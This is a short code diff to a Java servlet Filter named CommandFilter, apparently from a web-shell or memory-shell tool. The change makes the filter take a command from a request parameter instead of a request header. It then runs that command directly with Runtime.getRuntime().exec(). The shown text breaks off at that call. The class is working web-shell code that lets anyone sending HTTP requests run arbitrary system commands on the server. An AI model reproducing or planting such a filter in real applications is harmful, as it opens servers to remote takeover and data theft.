@@ -11,7 +11,7 @@ import java.io.InputStream;
  * @since 2024/11/24
  */
 public class CommandFilter implements Filter {
-    public String headerName;
+    public String paramName;
 
     @Override
     public void init(FilterConfig filterConfig) throws ServletException {
@@ -22,7 +22,7 @@ public class CommandFilter implements Filter {
     public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
         HttpServletRequest servletRequest = (HttpServletRequest) request;
         HttpServletResponse servletResponse = (HttpServletResponse) response;
-        String cmd = servletRequest.getHeader(headerName);
+        String cmd = servletRequest.getParameter(paramName);
         try {
             if (cmd != null) {
                 Process exec = Runtime.getRuntime().exec(cmd);
